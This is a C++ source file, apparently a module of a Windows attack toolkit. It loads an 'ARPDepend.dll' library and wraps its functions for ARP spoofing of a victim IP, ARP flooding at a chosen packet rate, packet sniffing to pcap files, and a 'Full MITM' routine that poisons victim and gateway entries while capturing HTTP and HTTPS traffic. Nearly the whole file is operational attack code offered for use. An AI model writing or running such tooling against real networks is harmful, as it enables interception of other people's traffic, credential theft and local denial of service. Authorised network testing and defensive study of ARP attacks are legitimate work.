#include "../Module/ModuleBase.h"
#include "../Utils/Color.h"
#include <iostream>
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <filesystem>
#include <cstdio>
#include <format>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <chrono>
#include <atomic>

typedef void* (WINAPI* PFN_ArpSpoofStart) (const char*, const char*, const char*, int, int);
typedef void* (WINAPI* PFN_ArpFloodStart)  (const char*, int);
typedef void* (WINAPI* PFN_ArpSniffStart)  (const char*, const char*, const char*, int);
typedef int       (WINAPI* PFN_ArpIsRunning)   (void*);
typedef uint64_t(WINAPI* PFN_ArpGetFwdCount) (void*);
typedef uint64_t(WINAPI* PFN_ArpGetPktCount) (void*);
typedef void      (WINAPI* PFN_ArpStop)        (void*);
typedef int       (WINAPI* PFN_ArpRestore)     (const char*, const char*, const char*);
typedef const char* (WINAPI* PFN_ArpGetLastError)();

struct ArpDll {
    HMODULE               Module = NULL;

    PFN_ArpSpoofStart     ArpSpoofStart = NULL;
    PFN_ArpFloodStart     ArpFloodStart = NULL;
    PFN_ArpSniffStart     ArpSniffStart = NULL;
    PFN_ArpIsRunning      ArpIsRunning = NULL;
    PFN_ArpGetFwdCount    ArpGetFwdCount = NULL;
    PFN_ArpGetPktCount    ArpGetPktCount = NULL;
    PFN_ArpStop           ArpStop = NULL;
    PFN_ArpRestore        ArpRestore = NULL;
    PFN_ArpGetLastError   ArpGetLastError = NULL;
};

namespace ArptControl {
inline std::atomic<bool>& StopRequestedFlag() {
    static std::atomic<bool> Flag{false};
    return Flag;
}

inline void ResetStop() {
    StopRequestedFlag().store(false, std::memory_order_release);
}

inline void RequestStop() {
    StopRequestedFlag().store(true, std::memory_order_release);
}

inline bool StopRequested() {
    return StopRequestedFlag().load(std::memory_order_acquire);
}

inline void WaitForStop() {
    while (!StopRequested()) {
        Sleep(80);
    }
}
} 

inline std::string WinErrorText(DWORD Code) {
    if (Code == 0) return "0";
    char* Buf = nullptr;
    DWORD Len = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        Code,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        reinterpret_cast<LPSTR>(&Buf),
        0,
        nullptr);
    std::string Out = Len && Buf ? std::string(Buf, Buf + Len) : std::string();
    if (Buf) LocalFree(Buf);
    while (!Out.empty() && (Out.back() == '\r' || Out.back() == '\n')) Out.pop_back();
    return Out.empty() ? std::to_string(Code) : (std::to_string(Code) + " (" + Out + ")");
}

inline std::string ExeDir() {
    char Path[MAX_PATH]{0};
    DWORD N = GetModuleFileNameA(nullptr, Path, MAX_PATH);
    if (N == 0 || N >= MAX_PATH) return ".\\";
    std::string S(Path, Path + N);
    const size_t Pos = S.find_last_of("\\/");
    if (Pos == std::string::npos) return ".\\";
    return S.substr(0, Pos + 1);
}

inline std::string ResolveArpDependPath(const char* Requested) {
    if (Requested && Requested[0]) {
        return std::string(Requested);
    }
    
    return ExeDir() + "Modules\\ARPDepend.dll";
}

ArpDll ArpLoad(const char* DllPath = "Modules/ARPDepend.dll") {
    ArpDll Dll;

    std::string Path = ResolveArpDependPath(DllPath);
    Dll.Module = LoadLibraryA(Path.c_str());
    if (!Dll.Module) {
        const DWORD Err = GetLastError();
        Color::PrintBad() << std::format(" LoadLibrary('{}') failed, code = {}\n", Path, WinErrorText(Err));
        Color::PrintBad() << std::format(" ExeDir: {}\n", ExeDir());
        return Dll;
    }

#define ARP_LOAD(Fn) Dll.##Fn = (PFN_##Fn)GetProcAddress(Dll.Module, #Fn)
    ARP_LOAD(ArpSpoofStart);
    ARP_LOAD(ArpFloodStart);
    ARP_LOAD(ArpSniffStart);
    ARP_LOAD(ArpIsRunning);
    ARP_LOAD(ArpGetFwdCount);
    ARP_LOAD(ArpGetPktCount);
    ARP_LOAD(ArpStop);
    ARP_LOAD(ArpRestore);
    ARP_LOAD(ArpGetLastError);
#undef ARP_LOAD
    const char** Ptrs = (const char**)&Dll.ArpSpoofStart;
    for (int I = 0; I < 9; I++) {
        if (!Ptrs[I]) {
            Color::PrintBad() << " GetProcAddress failed for function #" << I << std::endl;
            FreeLibrary(Dll.Module);
            Dll.Module = NULL;
            return Dll;
        }
    }
    Color::PrintGood() << " DLL loaded, " << Dll.Module << std::endl;
    return Dll;
}

void ArpUnload(ArpDll* Dll) {
    if (Dll->Module) {
        FreeLibrary(Dll->Module);
        Color::PrintGood() << " DLL unloaded.\n";
    }
    memset(Dll, 0, sizeof(*Dll));
}

void ArpSpoofA(ArpDll* Dll, const char* VictimIp, int IpForward) {
    ArptControl::ResetStop();
    Color::PrintInfo() << std::format(" Starting spoof on {}...\n", VictimIp);
    Color::PrintInfo() << " Use Stop button to stop.\n";
    void* Handle = Dll->ArpSpoofStart(VictimIp, NULL, NULL, 800, IpForward);
    if (!Handle) {
        Color::PrintBad() << std::format(" SpoofStart failed: {}\n", Dll->ArpGetLastError());
        return;
    }
    Color::PrintGood() << std::format(" OK, handle={}\n", Handle);
    Sleep(1000);
    Color::PrintInfo() << std::format("   forwarded={}\n", Dll->ArpGetFwdCount(Handle));
    ArptControl::WaitForStop();
    Dll->ArpStop(Handle);
    Color::PrintGood() << " Stopped, ARP tables restored.\n";
}

void ArpFloodA(ArpDll* Dll, int Rate) {
    ArptControl::ResetStop();
    Color::PrintInfo() << std::format(" Starting flood, rate={} pps...\n", Rate);

    void* Handle = Dll->ArpFloodStart(NULL, Rate);
    if (!Handle) {
        Color::PrintBad() << std::format(" FloodStart failed: {}\n", Dll->ArpGetLastError());
        return;
    }

    Color::PrintInfo() << " Use Stop button to stop.\n";
    ArptControl::WaitForStop();

    Dll->ArpStop(Handle);
    Color::PrintGood() << std::format(" Total sent: {} packets\n", Dll->ArpGetFwdCount(Handle));
}

void ArpSniffA(ArpDll* Dll, const char* Filter) {
    ArptControl::ResetStop();
    Color::PrintInfo() << std::format(" Starting sniff, filter='{}'...\n", Filter ? Filter : "none");
    auto Now = std::chrono::system_clock::now();
    std::string S = std::format("{:%Y-%m-%d %H:%M:%S}", Now);
	std::string TmpS = std::format("Tmp/ARPSniff_{}.pcap", S);
    void* Handle = Dll->ArpSniffStart(NULL, Filter, TmpS.c_str(), 1);
    if (!Handle) {
        Color::PrintBad() << std::format(" SniffStart failed: {}\n", Dll->ArpGetLastError());
        return;
    }

    Color::PrintInfo() << " Use Stop button to stop.\n";
    ArptControl::WaitForStop();

    Dll->ArpStop(Handle);
    Color::PrintInfo() << std::format(" Captured: {} packets\n", Dll->ArpGetPktCount(Handle));
}

void ArpRestoreA(ArpDll* Dll, const char* VictimIp, const char* GatewayIp) {
    Color::PrintInfo() << std::format(" Restoring ARP for {} <-> {}...\n", VictimIp, GatewayIp);

    if (!Dll->ArpRestore(VictimIp, GatewayIp, NULL)) {
        Color::PrintBad() << std::format(" Restore failed: {}\n", Dll->ArpGetLastError());
        return;
    }

    Color::PrintGood() << " ARP tables restored OK.\n";
}

void MitmA(ArpDll* Dll, const char* VictimIp, const char* GatewayIp) {
    ArptControl::ResetStop();
    Color::PrintInfo() << std::format(" === Full MITM on {} ===\n", VictimIp);

    void* SpoofH = Dll->ArpSpoofStart(VictimIp, GatewayIp, NULL, 2000, 1);
    if (!SpoofH) {
        Color::PrintBad() << std::format(" Spoof failed: {}\n", Dll->ArpGetLastError());
        return;
    }

    void* SniffH = Dll->ArpSniffStart(NULL, "tcp port 80 or tcp port 443", NULL, 1);
    if (!SniffH) {
        Color::PrintBad() << std::format(" Sniff failed: {}\n", Dll->ArpGetLastError());
        Dll->ArpStop(SpoofH);
        return;
    }

    Color::PrintInfo() << std::format(" MITM active. SpoofH={}  SniffH={}\n", SpoofH, SniffH);
    Color::PrintInfo() << std::format(" Use Stop button to stop.\n\n");
    ArptControl::WaitForStop();

    Dll->ArpStop(SniffH);
    Dll->ArpStop(SpoofH);
    Color::PrintGood() << " MITM ended, ARP tables restored.\n";
}
